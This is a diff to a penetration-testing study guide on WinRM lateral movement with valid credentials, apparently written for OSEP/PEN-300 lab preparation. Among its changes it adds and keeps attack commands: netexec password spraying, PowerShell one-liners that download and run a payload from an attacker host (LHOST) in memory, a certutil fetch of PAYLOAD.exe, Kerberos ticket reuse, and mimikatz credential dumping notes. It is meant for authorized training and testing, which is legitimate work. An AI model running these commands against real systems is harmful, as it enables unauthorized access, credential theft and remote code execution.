@@ -4,7 +4,7 @@ For the official OSEP labs/exam, or systems you are written-authorized to test. 
 
 # 15 · WinRM lateral movement (valid creds · WinRM only)
 
-> Covers scenario: 56
+> Covers scenario: 56 · Related PEN-300 (`pen-300.pdf`) material: Chapter 18 *Windows Lateral Movement* — the book's fileless technique is §18.2 (service-control-manager based), and WinRM/PSRemoting itself has no dedicated section; it is used here as the transport.
 >
 > **Prerequisites:** you already have valid credentials (password / NTLM hash / Kerberos ticket); target 5985 (HTTP) or 5986 (HTTPS) is reachable; attacker box is Kali (evil-winrm, netexec, impacket) or a controlled Windows pivot
 
@@ -49,7 +49,7 @@ For the official OSEP labs/exam, or systems you are written-authorized to test. 
    netexec winrm TARGET -d DOMAIN -u USER -p 'PASS'
    ```
    Expected: `[+] TARGET:5985 - ... (Pwn3d!)`. `(Pwn3d!)` means local admin. Auth without that marker can still allow command execution (Remote Management Users need not be admins) — step 3 verifies for real.
-2. **(Optional batch) multi-target / spray**: cheat sheet `WinRM password spraying` / `Multiple targets with WinRM`:
+2. **(Optional batch) multi-target / spray**: quick-reference notes `WinRM password spraying` / `Multiple targets with WinRM`:
    ```bash
    netexec winrm targets.txt -d DOMAIN -u USER -p 'PASS' --continue-on-success
    ```
@@ -115,7 +115,7 @@ For the official OSEP labs/exam, or systems you are written-authorized to test. 
 | Script | Purpose | Key params |
 |---|---|---|
 | `m15-winrm-auth-matrix.ps1` | Plaintext/hash/Kerberos templates + failure checklist (PowerShell Remoting path) | `-Target`, `-User`, `-Pass`/`-NtHash`, `-Domain` |
-| `m15-winrm-lateral.md` | evil-winrm / netexec cheat sheet + in-session payload notes | — |
+| `m15-winrm-lateral.md` | evil-winrm / netexec quick-reference notes + in-session payload notes | — |
 
 #### `m15-winrm-auth-matrix.ps1`
 
@@ -186,8 +186,8 @@ if (-not $UseSSL -and -not $http.TcpTestSucceeded) { $UseSSL = $true }  # auto H
 Write-Ok "Ports reachable (5985=$($http.TcpTestSucceeded) 5986=$($https.TcpTestSucceeded)), using $($(if($UseSSL){'HTTPS'}else{'HTTP'}))."
 
 # ---------- 2. Auth form dispatch ----------
-$sessionOption = New-PSSessionOption -OperationTimeoutSec 60 -OpenTimeoutSec 60
-if ($UseSSL) { $sessionOption = New-PSSessionOption -OperationTimeoutSec 60 -OpenTimeoutSec 60 -SkipCACheck -SkipCNCheck }
+$sessionOption = New-PSSessionOption -OperationTimeout 00:01:00 -OpenTimeout 00:01:00
+if ($UseSSL) { $sessionOption = New-PSSessionOption -OperationTimeout 00:01:00 -OpenTimeout 00:01:00 -SkipCACheck -SkipCNCheck }
 
 $cred = $null
 if ($Pass) {
@@ -273,7 +273,7 @@ else {
 #### `m15-winrm-lateral.md`
 
 ````markdown
-# m15 · WinRM lateral cheat sheet (Kali / evil-winrm / netexec)
+# m15 · WinRM lateral quick-reference notes (Kali / evil-winrm / netexec)
 
 > Scenario 56: valid creds, SMB closed, only 5985/5986 open. Linux attacker side;
 >
@@ -366,8 +366,10 @@ Inside evil-winrm:
 # download and run .ps1
 IEX (New-Object Net.WebClient).DownloadString('http://LHOST/PAYLOAD.ps1')
 
-# no disk, no file: one-liner reverse (msfvenom → base64)
-$b = [Convert]::FromBase64String('...'); $m=[System.Diagnostics.Process]::GetCurrentProcess(); ...
+# no disk: run a base64-wrapped script in memory (UTF-16LE, the encoding -enc expects)
+# attacker: iconv -t UTF-16LE stage2.ps1 | base64 -w0
+$b64 = 'BASE64'
+IEX ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64)))
 ```
 
 ### 5.2 On-disk (only if needed: target downloads itself — never `\\LHOST\share`)
@@ -425,7 +427,7 @@ Then run: `C:\Windows\Temp\PAYLOAD.exe` (admin session can run directly; non-adm
 - **Confirm SMB is really closed** before abandoning PsExec-family tools — many lost points come from fighting the wrong channel without a port check. `nmap -Pn -p445,5985 TARGET` settles it once.
 - WinRM on 5985 leaves PowerShell sessions plus 4624/4625 and `Microsoft-Windows-WinRM` operational logs; NTLM hash auth leaves 4776 on the DC. Password spraying (step 2) amplifies lockout risk — **only when explicitly allowed and attempt-capped**.
 - evil-winrm `upload`/`download`, `scripts`/`loot` are session-only: files travel over WinRM — **do not** document “copy via SMB share” steps that contradict this scenario.
-- Sessions are interactive: long jobs (mimikatz sekurlsa) hang/timeout easily — cheat sheet `Having an Evil-WinRM session`: one-liners, copy results immediately, or redirect to a file then `download`.
+- Sessions are interactive: long jobs (mimikatz sekurlsa) hang/timeout easily — quick-reference notes `Having an Evil-WinRM session`: one-liners, copy results immediately, or redirect to a file then `download`.
 - Kerberos hard-requires name resolution; put the target hostname in Kali `/etc/hosts` or SPN resolution fails with `KRB_AP_ERR_MODIFIED`-class errors (check clock first).
 - In non-admin sessions, do not jump straight to priv-esc/credential tools — least-privilege recon first, then decide whether M06 is needed.
 
@@ -451,13 +453,17 @@ evil-winrm -i TARGET -u USER -p 'PASS' -S        # 5986 HTTPS
 impacket-getTGT 'DOMAIN/USER:PASS' -dc-ip DC_IP
 export KRB5CCNAME=$(pwd)/USER.ccache
 netexec winrm TARGET.dom -d DOMAIN -u USER -k --use-kcache
+```
 
+```powershell
 # 5) In-session in-memory delivery (preferred, no disk)
 IEX (New-Object Net.WebClient).DownloadString('http://LHOST/PAYLOAD.ps1')
 
 # 6) Windows pivot path
 winrs -r:TARGET -u:DOMAIN\USER -p:PASS "whoami"
-$s = New-PSSession -ComputerName TARGET -Credential (DOMAIN\USER,PASS)
+$pw = ConvertTo-SecureString 'PASS' -AsPlainText -Force
+$c  = New-Object System.Management.Automation.PSCredential('DOMAIN\USER', $pw)
+$s  = New-PSSession -ComputerName TARGET -Credential $c
 Invoke-Command -Session $s -ScriptBlock { whoami; hostname }
 
 # 7) On-disk fallback (target downloads itself)
@@ -471,4 +477,4 @@ certutil -urlcache -split -f http://LHOST/PAYLOAD.exe C:\Windows\Temp\PAYLOAD.ex
 | File | Description |
 |---|---|
 | `m15-winrm-auth-matrix.ps1` | Windows-side PowerShell Remoting plaintext/hash/Kerberos templates + failure triage |
-| `m15-winrm-lateral.md` | Kali (evil-winrm/netexec) cheat sheet + in-session payload notes |
+| `m15-winrm-lateral.md` | Kali (evil-winrm/netexec) quick-reference notes + in-session payload notes |
